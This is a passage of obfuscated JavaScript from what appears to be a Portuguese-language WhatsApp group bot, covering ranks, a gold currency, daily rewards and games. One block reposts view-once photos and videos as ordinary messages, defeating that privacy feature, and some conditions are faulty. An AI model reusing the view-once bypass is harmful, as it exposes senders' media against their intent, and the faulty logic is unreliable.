            }
            ;
            if (_0x2d77df >= 900 && _0x2d77df < 1000) {
              var _0x39d39e = "Sargento VII";
              var _0x5b6c65 = 11;
            }
            ;
            if (_0x2d77df >= 1000 && _0x2d77df < 1100) {
              var _0x39d39e = "Sargento VII";
              var _0x5b6c65 = 12;
            }
            ;
            if (_0x2d77df >= 1100 && _0x2d77df < 1200) {
              var _0x39d39e = "Sargento VIII";
              var _0x5b6c65 = 13;
            }
            ;
            if (_0x2d77df >= 1200 && _0x2d77df < 1500) {
              var _0x39d39e = "Sargento IX";
              var _0x5b6c65 = 14;
            }
            ;
            if (_0x2d77df >= 1500 && _0x2d77df < 2000) {
              var _0x39d39e = "Sargento X";
              var _0x5b6c65 = 15;
            }
            ;
            if (_0x2d77df >= 2000 && _0x2d77df < 2500) {
              var _0x39d39e = "Tenente I";
              var _0x5b6c65 = 16;
            }
            ;
            if (_0x2d77df >= 2500 && _0x2d77df < 2600) {
              var _0x39d39e = "Tenente II";
              var _0x5b6c65 = 17;
            }
            ;
            if (_0x2d77df >= 2600 && _0x2d77df < 2700) {
              var _0x39d39e = "Tenente III";
              var _0x5b6c65 = 18;
            }
            ;
            if (_0x2d77df >= 2700 && _0x2d77df < 2800) {
              var _0x39d39e = "Tenente III";
              var _0x5b6c65 = 19;
            }
            ;
            if (_0x2d77df >= 2800 && _0x2d77df < 2900) {
              var _0x39d39e = "Tenente IV";
              var _0x5b6c65 = 20;
            }
            ;
            if (_0x2d77df >= 2900 && _0x2d77df < 3000) {
              var _0x39d39e = "Tenente V";
              var _0x5b6c65 = 21;
            }
            ;
            if (_0x2d77df >= 3000 && _0x2d77df < 3200) {
              var _0x39d39e = "Capitão I";
              var _0x5b6c65 = 22;
            }
            ;
            if (_0x2d77df >= 3200 && _0x2d77df < 3400) {
              var _0x39d39e = "Capitão II";
              var _0x5b6c65 = 23;
            }
            ;
            if (_0x2d77df >= 3400 && _0x2d77df < 3800) {
              var _0x39d39e = "Capitão III";
              var _0x5b6c65 = 24;
            }
            ;
            if (_0x2d77df >= 3800 && _0x2d77df < 4000) {
              var _0x39d39e = "Capitão IV";
              var _0x5b6c65 = 25;
            }
            ;
            if (_0x2d77df >= 4000 && _0x2d77df < 5000) {
              var _0x39d39e = "Capitão V";
              var _0x5b6c65 = 26;
            }
            ;
            if (_0x2d77df >= 5000 && _0x2d77df < 5500) {
              var _0x39d39e = "Major I";
              var _0x5b6c65 = 27;
            }
            ;
            if (_0x2d77df >= 5500 && _0x2d77df < 6000) {
              var _0x39d39e = "Major II";
              var _0x5b6c65 = 28;
            }
            ;
            if (_0x2d77df >= 6000 && _0x2d77df < 6500) {
              var _0x39d39e = "Major III";
              var _0x5b6c65 = 29;
            }
            ;
            if (_0x2d77df >= 6500 && _0x2d77df < 8000) {
              var _0x39d39e = "Major IV";
              var _0x5b6c65 = 30;
            }
            ;
            if (_0x2d77df >= 8000 && _0x2d77df < 9000) {
              var _0x39d39e = "Major V";
              var _0x5b6c65 = 31;
            }
            ;
            if (_0x2d77df >= 9000 && _0x2d77df < 10000) {
              var _0x39d39e = "Tenente C I";
              var _0x5b6c65 = 32;
            }
            ;
            if (_0x2d77df >= 10000 && _0x2d77df < 11000) {
              var _0x39d39e = "Tenente C II";
              var _0x5b6c65 = 33;
            }
            ;
            if (_0x2d77df >= 11000 && _0x2d77df < 12000) {
              var _0x39d39e = "Tenente C II";
              var _0x5b6c65 = 34;
            }
            ;
            if (_0x2d77df >= 12000 && _0x2d77df < 13000) {
              var _0x39d39e = "Tenente C III";
              var _0x5b6c65 = 35;
            }
            ;
            if (_0x2d77df >= 13000 && _0x2d77df < 15000) {
              var _0x39d39e = "Tenente C IV";
              var _0x5b6c65 = 36;
            }
            ;
            if (_0x2d77df >= 15000 && _0x2d77df < 17000) {
              var _0x39d39e = "Tenente C V";
              var _0x5b6c65 = 37;
            }
            ;
            if (_0x2d77df >= 17000 && _0x2d77df < 20000) {
              var _0x39d39e = "Coronel I";
              var _0x5b6c65 = 38;
            }
            ;
            if (_0x2d77df >= 20000 && _0x2d77df < 23000) {
              var _0x39d39e = "Coronel II";
              var _0x5b6c65 = 39;
            }
            ;
            if (_0x2d77df >= 25000 && _0x2d77df < 28000) {
              var _0x39d39e = "Coronel III";
              var _0x5b6c65 = 40;
            }
            ;
            if (_0x2d77df >= 28000 && _0x2d77df < 30000) {
              var _0x39d39e = "Coronel IV";
              var _0x5b6c65 = 41;
            }
            ;
            if (_0x2d77df >= 30000 && _0x2d77df < 35000) {
              var _0x39d39e = "Coronel V";
              var _0x5b6c65 = 42;
            }
            if (_0x2ca1df && !_0x51a818 == "stickerMessage") {
              switch (_0x2d77df) {
                case 20:
                case 50:
                case 100:
                case 200:
                case 300:
                case 400:
                case 500:
                case 600:
                case 700:
                case 800:
                case 900:
                case 1000:
                case 1100:
                case 1200:
                case 1500:
                case 2000:
                case 2500:
                case 2600:
                case 2700:
                case 2800:
                case 2900:
                case 3000:
                case 3200:
                case 3400:
                case 3600:
                case 3800:
                case 4000:
                case 5000:
                case 5500:
                case 6000:
                case 6500:
                case 8000:
                case 9000:
                case 10000:
                case 11000:
                case 12000:
                case 13000:
                case 15000:
                case 17000:
                case 20000:
                case 23000:
                case 25000:
                case 28000:
                case 30000:
                  _0x263319.sendMessage(_0x4f1071, {
                    text: "\n￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣\n✥ Parabéns: @" + _0x32e455.split("@")[0] + "\n\nVocê upou de level e também de patente por completar " + _0x2d77df + " mensagens e recebeu 25 Golds, veja as informações abaixo..\n\n✧ Patente: " + _0x39d39e + "\n\n✧ Level: " + _0x5b6c65 + "\n\n￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣",
                    mentions: [_0x32e455]
                  });
                  if (JSON.stringify(rggold).includes(_0x4f1071)) {
                    var _0x280f32 = rggold.map(_0x432b3b => _0x432b3b.grupo).indexOf(_0x4f1071);
                    if (JSON.stringify(rggold[_0x280f32].usus).includes(_0x32e455)) {
                      var _0x43cf52 = rggold[_0x280f32].usus.map(_0x4df587 => _0x4df587.id).indexOf(_0x32e455);
                      rggold[_0x280f32].usus[_0x43cf52].Golds += 25;
                      _0x61f85(rggold);
                    }
                  }
                  break;
              }
            }
          }
          if (_0xd20756) {
            if (!JSON.stringify(patentes).includes(_0x4f1071)) {
              const _0x472bef = {
                id: _0x32e455,
                level_usu: _0x5b6c65,
                patente_usu: _0x39d39e
              };
              const _0x4f4bb5 = {
                grupoID: _0x4f1071,
                usus: [_0x472bef]
              };
              patentes.push(_0x4f4bb5);
              fs.writeFileSync("./DADOS/patentes.json", JSON.stringify(patentes));
            }
            var _0x4893dc = patentes.map(_0x587b4a => _0x587b4a.grupoID).indexOf(_0x4f1071);
            if (!JSON.stringify(patentes[_0x4893dc].usus).includes(_0x32e455)) {
              const _0xd0834d = {
                id: _0x32e455,
                level_usu: _0x5b6c65,
                patente_usu: _0x39d39e
              };
              patentes[_0x4893dc].usus.push(_0xd0834d);
              fs.writeFileSync("./DADOS/patentes.json", JSON.stringify(patentes));
            }
            var _0x92e1d6 = patentes[_0x4893dc].usus.map(_0x5ee7d3 => _0x5ee7d3.id).indexOf(_0x32e455);
            if (patentes[_0x4893dc].usus[_0x92e1d6].patente_usu != _0x39d39e) {
              patentes[_0x4893dc].usus[_0x92e1d6].patente_usu = _0x39d39e;
              fs.writeFileSync("./DADOS/patentes.json", JSON.stringify(patentes));
            }
            if (patentes[_0x4893dc].usus[_0x92e1d6].level_usu != _0x5b6c65) {
              patentes[_0x4893dc].usus[_0x92e1d6].level_usu = _0x5b6c65;
              fs.writeFileSync("./DADOS/patentes.json", JSON.stringify(patentes));
            }
          }
          const _0x57c94d = (_0x29c7be, _0xc498d) => {
            if (JSON.stringify(_0x29c7be).includes(_0xc498d)) {
              return true;
            }
            return false;
          };
          const _0x4aa237 = JSON.parse(fs.readFileSync("./DADOS/usuarios/usuarios/SystemRPG/attday.json"));
          const _0x324b53 = moment.tz("America/Sao_Paulo").format("DD/MM/YYYY");
          if (_0x2e320b != undefined && _0xd20756 && _0x589394 && _0x57c94d(sabrpg, _0x32e455)) {
            var _0x4893dc = sabrpg.map(_0x62f8dd => _0x62f8dd.id).indexOf(_0x32e455);
            function _0x14c7d7() {
              const _0x4d676d = {
                id: _0x32e455,
                data: _0x324b53
              };
              _0x4aa237.push(_0x4d676d);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/attday.json", JSON.stringify(_0x4aa237));
              sabrpg[_0x4893dc].money += 25;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              const _0x2beac6 = _0x589394 ? "Olá *@" + _0x32e455.split("@")[0] + "*, você recebeu *R$ 25.00* pela sua primeira mensagem do dia. Além disso, diversos jogos para se entreter no grupo! 🌟🪙\n——\n• Use o comando *" + _0x1d93be + "menubotcity*, lhe desejo boa sorte e divirta-se!" : "Olá *@" + _0x32e455.split("@")[0] + "*, você recebeu *R$ 25.00* pela sua primeira mensagem do dia. Além disso, diversos jogos para se entreter no grupo! 🌟🪙\n——\n• Use o comando *" + _0x1d93be + "menurpg*, lhe desejo boa sorte e divirta-se!";
              _0x5b6fe5(_0x2beac6);
            }
            if (!_0x57c94d(_0x4aa237, _0x32e455)) {
              _0x14c7d7();
            } else {
              var _0x3529b0 = _0x4aa237.map(_0x9ae14c => _0x9ae14c.id).indexOf(_0x32e455);
              if (_0x4aa237[_0x3529b0].data != _0x324b53) {
                _0x4aa237[_0x3529b0].data = _0x324b53;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/attday.json", JSON.stringify(_0x4aa237));
                sabrpg[_0x4893dc].money += 25;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                _0x5b6fe5("Olá *@" + _0x32e455.split("@")[0] + "*, você recebeu *R$ 25.00* pela sua primeira mensagem do dia. Além disso, diversos jogos para se entreter no grupo! 🌟🪙\n——\n• Use o comando *" + _0x1d93be + "menubotcity*, lhe desejo boa sorte e divirta-se!");
              }
            }
          }
          if (_0x1d56ff) {
            if (_0x302296.message?.viewOnceMessageV2 || _0x51a818 == "viewOnceMessage") {
              if (JSON.stringify(_0x302296).includes("videoMessage")) {
                var _0x3723e0 = _0x302296.message?.viewOnceMessageV2?.message?.videoMessage || _0x302296.message?.viewOnceMessage?.message?.videoMessage;
                _0x3723e0.viewOnce = false;
                _0x3723e0.video = {
                  url: _0x3723e0.url
                };
                _0x3723e0.caption += "\n\nRevelando Visualização única..";
                _0x263319.sendMessage(_0x4f1071, _0x3723e0);
              } else {
                var _0x3723e0 = _0x302296.message?.viewOnceMessageV2?.message?.imageMessage || _0x302296.message?.viewOnceMessage?.message?.imageMessage;
                _0x3723e0.viewOnce = false;
                _0x3723e0.image = {
                  url: _0x3723e0.url
                };
                _0x3723e0.caption += "\n\nRevelando Visualização única..";
                _0x263319.sendMessage(_0x4f1071, _0x3723e0);
              }
            }
          }
          function _0x61f85(_0x31d3cd) {
            fs.writeFileSync("./DADOS/golds.json", JSON.stringify(_0x31d3cd, null, 2) + "\n");
          }
          if (!JSON.stringify(rggold).includes(_0x4f1071)) {
            const _0x53c8fe = {
              grupo: _0x4f1071,
              usus: []
            };
            rggold.push(_0x53c8fe);
            _0x61f85(rggold);
          }
          if (_0xd20756 && _0x3fb600) {
            var _0x280f32 = rggold.map(_0x170cc7 => _0x170cc7.grupo).indexOf(_0x4f1071);
            var _0x3b3047 = [];
            for (_0xc3d45a of rggold[_0x280f32].usus) {
              _0x3b3047.push(_0xc3d45a.id);
            }
            if (_0x3b3047.indexOf(_0x32e455) < 0) {
              const _0xb5477e = {
                id: _0x32e455,
                Golds: 0,
                data: 0,
                desligar: false
              };
              rggold[_0x280f32].usus.push(_0xb5477e);
              _0x61f85(rggold);
            }
            ;
            await sleep(100);
            if (JSON.stringify(rggold).includes(_0x4f1071) && JSON.stringify(rggold[_0x280f32].usus).includes(_0x32e455)) {
              var _0x280f32 = rggold.map(_0x2d2495 => _0x2d2495.grupo).indexOf(_0x4f1071);
              var _0x43cf52 = rggold[_0x280f32].usus.map(_0x35cc2e => _0x35cc2e.id).indexOf(_0x32e455);
              var _0x2f0b31 = async (_0x2905a8, _0x1bdcca) => {
                rggold[_0x280f32].usus[rggold[_0x280f32].usus.map(_0x20afa1 => _0x20afa1.id).indexOf(_0x1bdcca)].Golds += _0x2905a8;
                _0x61f85(rggold);
                _0x263319.sendMessage(_0x4f1071, {
                  text: "Parabéns: > @" + _0x1bdcca.split("@")[0] + " você ganhou " + _0x2905a8 + " Golds.. ",
                  mentions: [_0x1bdcca]
                });
              };
              var _0x1c8207 = async _0xc43120 => {
                _0x263319.sendMessage(_0x4f1071, {
                  text: "Olá @" + _0xc43120.split("@")[0] + " você contém " + rggold[_0x280f32].usus[rggold[_0x280f32].usus.map(_0x426684 => _0x426684.id).indexOf(_0xc43120)].Golds + " Golds, breve você será bem mais rico que Elon Musk, só confia..",
                  mentions: [_0xc43120]
                });
              };
              var _0x1fb8da = async (_0x149898, _0x30f747) => {
                rggold[_0x280f32].usus[rggold[_0x280f32].usus.map(_0x4a5ee8 => _0x4a5ee8.id).indexOf(_0x30f747)].Golds -= _0x149898;
                _0x61f85(rggold);
                _0x263319.sendMessage(_0x4f1071, {
                  text: "Que pena... @" + _0x30f747.split("@")[0] + " você perdeu " + _0x149898 + " Golds.. ",
                  mentions: [_0x30f747]
                });
              };
              var _0x4b05d2 = async (_0x4326dc, _0x3233cd) => {
                if (rggold[_0x280f32].usus[_0x43cf52].Golds < _0x4326dc) {
                  return _0x403602("Você não tem Golds suficiente para utilizar este comando..");
                }
                rggold[_0x280f32].usus[rggold[_0x280f32].usus.map(_0x134442 => _0x134442.id).indexOf(_0x3233cd)].Golds -= _0x4326dc;
                _0x61f85(rggold);
                _0x5b6fe5(_0x6965b0 + " @" + _0x32e455.split("@")[0] + "  após o uso do comando " + _0x3dec88 + " foi consumido " + _0x4326dc + " Golds dos seus > " + (rggold[_0x280f32].usus[_0x43cf52].Golds + _0x4326dc) + " Golds");
              };
              var _0x5b3d2b = rggold[_0x280f32].usus[_0x43cf52].Golds;
              var _0xb4dacd = moment.tz("America/Sao_Paulo").format("DD/MM/YY");
              if (rggold[_0x280f32].usus[_0x43cf52].desligar == false) {
                async function _0x409b20() {
                  _0x5b6fe5("✫ Parabéns @" + _0x32e455.split("@")[0] + " - \nVocê recebeu 10 Golds pela primeira mensagem do dia e também 0/2 para mineração de área, utilize o comando " + _0x1d93be + "minerar_gold 2 vez, " + _0x6965b0 + " ✫");
                  rggold[_0x280f32].usus[_0x43cf52].data = _0xb4dacd;
                  rggold[_0x280f32].usus[_0x43cf52].desligar = true;
                  rggold[_0x280f32].usus[_0x43cf52].Golds += 10;
                  _0x61f85(rggold);
                  if (!JSON.stringify(_0x3bd584[0].minerar_gold).includes(_0x32e455)) {
                    const _0x1b6295 = {
                      id: _0x32e455,
                      ChanceG: 0
                    };
                    _0x3bd584[0].minerar_gold.push(_0x1b6295);
                    _0x33e29e(_0x3bd584);
                  }
                  await sleep(200);
                  var _0x4c291f = _0x3bd584[0].minerar_gold.map(_0x3a691a => _0x3a691a.id).indexOf(_0x32e455);
                  _0x3bd584[0].minerar_gold[_0x4c291f].ChanceG = null;
                  _0x33e29e(_0x3bd584);
                }
                return _0x409b20();
              }
            }
            if (_0xb4dacd != rggold[_0x280f32].usus[_0x43cf52].data) {
              rggold[_0x280f32].usus[_0x43cf52].data = _0xb4dacd;
              rggold[_0x280f32].usus[_0x43cf52].desligar = false;
              _0x61f85(rggold);
            }
          }
          if (_0xf2654c) {
            return BannedExpired(ban);
          }
          var _0x5707c1 = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/palavras_forca.json"));
          var _0x1fca7a = _0x5707c1[Math.floor(Math.random() * _0x5707c1.length)];
          var _0x4b647e = _0x1fca7a.plvr.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
          async function _0x799bb8() {
            var _0x16ecec = [];
            for (let _0x343f53 = 0; _0x343f53 < _0x4b647e.length; _0x343f53++) {
              if (_0x4b647e[_0x343f53] == " ") {
                _0x16ecec.push(" ");
              } else {
                _0x16ecec.push("_");
              }
            }
            const _0xc98c63 = {
              acertos: 0,
              erros: 0,
              palavra: _0x16ecec,
              escreveu: [],
              palavra_ofc: _0x4b647e,
              dica: _0x1fca7a.dica,
              tema: _0x1fca7a.tema
            };
            _0x3bd584[0].forca_ofc = [_0xc98c63];
            _0x3bd584[0].forca_inc = false;
            _0x33e29e(_0x3bd584);
          }
          if (fs.existsSync("./DADOS/duelo_" + _0x4f1071 + ".json")) {
            var _0x768e6 = JSON.parse(fs.readFileSync("./DADOS/duelo_" + _0x4f1071 + ".json"));
            var _0x210169 = moment.tz("America/Sao_Paulo").format("HH:mm");
            if (_0x768e6.iniciar_vot.indexOf(_0x210169) >= 0 && _0x768e6.iniciou == false) {
              const _0x4a8553 = {
                title: "Votação..",
                rows: [{
                  title: "Usuário Vermelho",
                  rowId: _0x1d93be + "duelo_v1",
                  description: "Não poderá votar novamente, nem mudar o voto."
                }, {
                  title: "Usuário Azul",
                  rowId: _0x1d93be + "duelo_v2",
                  description: "Não poderá votar novamente, nem mudar o voto."
                }]
              };
              const _0x361a1e = {
                title: "Terminar Votação..",
                rows: [{
                  title: "Terminar votação..",
                  rowId: _0x1d93be + "terminar_vot_duelo",
                  description: "Só o Adm pode finalizar a votação.."
                }]
              };
              var _0x4943f1 = [_0x4a8553, _0x361a1e];
              var _0x5352b8 = {
                text: "Iniciou a votação e duelo finalizado.\n\n@" + _0x768e6.usu1.split("@")[0] + " VS @" + _0x768e6.usu2.split("@")[0] + "\n\nSó pode votar uma vez, boa sorte guerreiros ✍️",
                footer: "Vote com atenção e seja justo com quem merece 😉.",
                title: "Urna de votar.",
                buttonText: "Clique aqui para votar..",
                mentions: [_0x768e6.usu1, _0x768e6.usu2],
                sections: _0x4943f1
              };
              var _0x3445cf = await _0x263319.sendMessage(_0x4f1071, _0x5352b8);
              await sleep(100);
              _0x768e6.iniciou = true;
              fs.writeFileSync("./DADOS/duelo_" + _0x4f1071 + ".json", JSON.stringify(_0x768e6, null, 2));
            }
          }
          if (_0x52ab25 && !_0x594818 && !_0x302296.key.fromMe) {
            if (isFiltered(_0x32e455)) {
              return _0x403602("𝙀𝙨𝙥𝙚𝙧𝙚 【 𝟮𝘀 】 𝙥𝙖𝙧𝙖 𝙪𝙨𝙖𝙧 𝙤𝙪𝙩𝙧𝙤 𝙘𝙤𝙢𝙖𝙣𝙙𝙤 𝙤𝙪 𝙚𝙭𝙚𝙘𝙪𝙩𝙖𝙧 𝙤 𝙢𝙚𝙨𝙢𝙤...");
              await sleep(1500);
            } else {
              addFilter(_0x32e455);
            }
          }
          switch (_0x3dec88) {
            case "cript":
            case "criptografar":
            case "enc":
              {
                if (!_0x2a5ff3) {
                  return _0x403602(_0x7e2f25);
                }
                if (!_0x1d6557) {
                  return _0x403602("_Use o comando corretamente " + (_0x1d93be + comand) + " const conn = require('x-bot')_");
                }
                let _0x22329b = await _0x127113(_0x1d6557);
                _0x403602("" + _0x22329b.result);
              }
              break;
            case "listlinks":
            case "links":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              LNK = "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n\n";
              for (_0xc3d45a = 0; _0xc3d45a < recolherLNK.length; _0xc3d45a++) {
                LNK += "Link - " + (_0xc3d45a + 1) + " _- " + recolherLNK[_0xc3d45a].Link + "\n\n";
              }
              _0x403602(LNK);
              break;
            case "lista_aluguel2":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              bla = "_-_-_-_-_-_-_-_-_-_-_-_-_-\n\n";
              for (_0xc3d45a = 0; _0xc3d45a < rg_aluguel.length; _0xc3d45a++) {
                bla += "_- [ " + (_0xc3d45a + 1) + " ] - Data de vencimento: " + rg_aluguel[_0xc3d45a].data + "\n\nID DO GRUPO: " + rg_aluguel[_0xc3d45a].grupo + "\n\nNome do Grupo: " + rg_aluguel[_0xc3d45a].nome_do_gp + "\n\nTexto informando sobre o Dono do grupo alugado: " + rg_aluguel[_0xc3d45a].texto + "\n\n_-_-_-_-_-_-_-_-_-_-_-_-_-\n\n";
              }
              _0x403602(bla);
              break;
            case "rm_aviso":
            case "rm_avisos":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              for (_0xc3d45a of black_) {
                var _0x2699fb = _0xc3d45a;
              }
              if (!JSON.stringify(_0x2699fb.PUXAR).includes(_0x4f1071)) {
                return _0x403602("Nenhum aviso foi registrado nesse grupo, utilize o comando " + _0x1d93be + "rg_aviso");
              }
              _0x2699fb.PUXAR.splice(_0x2699fb.PUXAR.indexOf(_0x4f1071));
              fs.writeFileSync("./DADOS/usuarios/grupos/AVISOS.json", JSON.stringify(black_, null, 2));
              _0x403602("Avisos referente a esse grupo, foi tirado de todos os horários registrados..");
              break;
            case "rg_aviso":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              var [_0x1f0d08, _0x5430da] = _0x1d6557.trim().split("|");
              if (!_0x1d6557.trim().includes(":") && !_0x1d6557.trim().includes("|")) {
                return _0x403602("Exemplo: " + (_0x1d93be + _0x3dec88) + " 12:00|Boa tarde a todos, prestem atenção nas regras do grupo\n\neste exemplo.. Ele vai enviar todos os dias as 12:00 da tarde a mensagem que você registrou, já se você quer trocar o horário.. Só refazer o comando\nSe você quer apagar o aviso do grupo, apenas coloque " + _0x1d93be + "rm_aviso");
              }
              var _0x537f44 = black_?.map(_0x39457a => _0x39457a?.hora)?.indexOf(_0x1f0d08);
              if (JSON.stringify(black_[_0x537f44]?.PUXAR)?.includes(_0x4f1071)) {
                black_[_0x537f44].PUXAR.splice(black_[_0x537f44].PUXAR.map(_0x198f8d => _0x198f8d.idgp).indexOf(_0x4f1071));
                fs.writeFileSync("./DADOS/usuarios/grupos/AVISOS.json", JSON.stringify(black_, null, 2));
                setTimeout(() => {
                  EnvBotao(_0x4f1071, _0x32e455, _0x263319, "O Registro anterior foi apagado e recriou um novo, se deseja continuar, clique no botão abaixo..\n - Lembre-se que há avisos programados em outros horários, se quiser limpar todos, digite: " + _0x1d93be + "rm_avisos", "🤖", "1|0", [_0x1d93be + _0x3dec88 + (" " + _0x1d6557), "< PROSSEGUIR >"], _0x302296);
                }, 500);
              } else if (!JSON.stringify(black_).includes(_0x1f0d08)) {
                const _0x4375df = {
                  idgp: _0x4f1071,
                  msg: _0x5430da,
                  avisou: false
                };
                const _0x4ca123 = {
                  hora: _0x1f0d08,
                  PUXAR: [_0x4375df]
                };
                black_.push(_0x4ca123);
                fs.writeFileSync("./DADOS/usuarios/grupos/AVISOS.json", JSON.stringify(black_, null, 2));
                _0x403602("Aviso Criado com sucesso..");
              } else if (!JSON.stringify(black_[_0x537f44].PUXAR).includes(_0x4f1071)) {
                const _0x14fdd4 = {
                  idgp: _0x4f1071,
                  msg: _0x5430da,
                  avisou: false
                };
                black_[_0x537f44].PUXAR.push(_0x14fdd4);
                fs.writeFileSync("./DADOS/usuarios/grupos/AVISOS.json", JSON.stringify(black_, null, 2));
                _0x403602("Aviso Criado com sucesso..");
              }
              break;
            case "rg_aluguel":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (JSON.stringify(rg_aluguel).includes(_0x4f1071)) {
                return _0x403602("Este grupo ja foi registrado");
              }
              var [_0x105f0a, _0x481435] = _0x1d6557.trim().split("|");
              if (!_0x1d6557.trim().includes("|")) {
                return _0x403602("Cade a |\nExemplo: " + (_0x1d93be + _0x3dec88) + " 01/01|Dono do grupo: 555555555 / Pra cobrar o aluguel..");
              }
              const _0x3f157c = {
                grupo: _0x4f1071,
                data: _0x105f0a,
                texto: _0x481435,
                nome_do_gp: _0x471350,
                cobrou: false
              };
              rg_aluguel.push(_0x3f157c);
              fs.writeFileSync("./DADOS/rg_aluguel.json", JSON.stringify(rg_aluguel));
              _0x403602("Registro de aluguel deste grupo, foi feito com sucesso...");
              break;
            case "iddogrupo":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              _0x403602(_0x4f1071);
              break;
            case "rm_aluguel":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x1d6557.trim().includes("g.us")) {
                return _0x403602("Digite o ID do grupo que deseja tirar da lista de aluguel, fórma mais fácil de achar o id é consultando o comando lista_aluguel, ou então executando o comando iddogrupo dentro do grupo que deseja tirar da lista de aluguel, e copiando o id, e executando dessa fórma.\nExemplo: " + (_0x1d93be + _0x3dec88) + " 120363343392567405@g.us");
              }
              var _0x209e1e = rg_aluguel.map(_0xaac1f2 => _0xaac1f2.grupo).indexOf(_0x1d6557.trim());
              rg_aluguel.splice(_0x209e1e, 1);
              fs.writeFileSync("./DADOS/rg_aluguel.json", JSON.stringify(rg_aluguel));
              _0x403602("Grupo tirado do registro de aluguel com sucesso..");
              break;
            case "minerar_gold":
            case "minerar_golds":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (!_0x3fb600) {
                return _0x403602("Este comando só pode ser utilizado quando o sistema " + _0x1d93be + "sistemgold 1 está ativado.");
              }
              blit = [];
              for (_0xc3d45a of _0x3bd584[0].minerar_gold) {
                blit.push(_0xc3d45a.id);
              }
              if (blit.indexOf(_0x32e455) < 0) {
                const _0x1f507d = {
                  id: _0x32e455,
                  ChanceG: null
                };
                _0x3bd584[0].minerar_gold.push(_0x1f507d);
                _0x33e29e(_0x3bd584);
              }
              await sleep(200);
              var _0x8d76fa = _0x3bd584[0].minerar_gold.map(_0x3a1958 => _0x3a1958.id).indexOf(_0x32e455);
              if (_0x3bd584[0].minerar_gold[_0x8d76fa].ChanceG == 2) {
                return _0x403602("Você não tem mais chances de minerar Gold, volte amanhã...");
              }
              _0x3bd584[0].minerar_gold[_0x8d76fa].ChanceG += 1;
              _0x33e29e(_0x3bd584);
              rnd = Math.floor(Math.random() * 2);
              rndg = Math.floor(Math.random() * 15);
              if (rnd == 0) {
                _0x5b6fe5("Parabéns @" + _0x32e455.split("@")[0] + " você recebeu " + rndg + " Golds, você só pode minerar 2 vez por dia... " + (_0x3bd584[0].minerar_gold[_0x8d76fa].ChanceG == 2 ? "infelizmente você não tem mais chances para minerar hoje, volte amanhã.." : "Ainda resta 1/2 para obter Golds, sua chance é 0/2"));
                var _0x280f32 = rggold.map(_0x5b3c0f => _0x5b3c0f.grupo).indexOf(_0x4f1071);
                var _0x43cf52 = rggold[_0x280f32].usus.map(_0x51c426 => _0x51c426.id).indexOf(_0x32e455);
                rggold[_0x280f32].usus[_0x43cf52].Golds += rndg;
                _0x61f85(rggold);
              } else if (rnd != 0) {
                _0x403602("A, você não teve sorte dessa vez, sinto muito... " + (_0x3bd584[0].minerar_gold[_0x8d76fa].ChanceG == 2 ? "infelizmente você não tem mais chances para minerar hoje, volte amanhã.." : "Ainda resta 1/2 para obter Golds, sua chance é 0/2"));
              }
              break;
            case "addpalavras_forca":
            case "addpalavras_f":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              var [_0x4a8ba3, _0x4d1b5b, _0x3c7ea4] = _0x1d6557.toLowerCase().trim().split("|");
              if (!_0x1d6557.includes("|")) {
                return _0x403602("Faltanda a primeira |\nExemplo: " + (_0x1d93be + _0x3dec88) + " titulo|tema|dica");
              }
              if (_0x1d6557.lastIndexOf("|") < 0) {
                return _0x403602("Faltando a segunda |\nExemplo: " + (_0x1d93be + _0x3dec88) + " titulo|tema|dica");
              }
              kir = [];
              for (_0xc3d45a of _0x5707c1) {
                kir.push(_0xc3d45a.plvr);
              }
              if (kir.indexOf(_0x4a8ba3.toLowerCase().trim()) >= 0) {
                return _0x403602("Este título já foi adicionado/existente...");
              }
              const _0x5383df = {
                plvr: _0x4a8ba3,
                tema: _0x4d1b5b,
                dica: _0x3c7ea4
              };
              _0x5707c1.push(_0x5383df);
              fs.writeFileSync("./DADOS/usuarios/grupos/palavras_forca.json", JSON.stringify(_0x5707c1, null, 2));
              _0x403602("Palavra adicionada ao jogo da forca com sucesso...");
              break;
            case "rmpalavra_f":
            case "rmpalavra_forca":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              var _0x537f44 = _0x5707c1.map(_0x21635d => _0x21635d.plvr).indexOf(_0x1d6557.trim().toLowerCase());
              _0x5707c1.splice(_0x537f44, 1);
              fs.writeFileSync("./DADOS/usuarios/grupos/palavras_forca.json", JSON.stringify(_0x5707c1, null, 2));
              _0x403602("Palavra tirada do jogo da forca com sucesso...");
              break;
            case "rv-forca":
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602(_0x5c594c);
              }
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              if (_0x3bd584[0].forca_inc == false) {
                return _0x403602("O jogo não foi iniciado.\nDigite " + _0x1d93be + "iniciar_forca");
              }
              _0x799bb8();
              _0x403602("Forca resetada com sucesso...");
              break;
            case "mostrar_forca":
            case "ver_forca":
            case "iniciar_forca":
              if (!_0xd20756) {
                return _0x403602(_0x270bdf);
              }
              try {
                if (_0x3bd584[0].forca_inc) {
                  return _0x403602("Jogo já está em andamento, caso queira resetar, fale com um adm para executar " + _0x1d93be + "rv-forca, ou tente acertar o jogo da forca que deve está logo a cima.");
                }
                if (!_0x3bd584[0].forca_inc) {
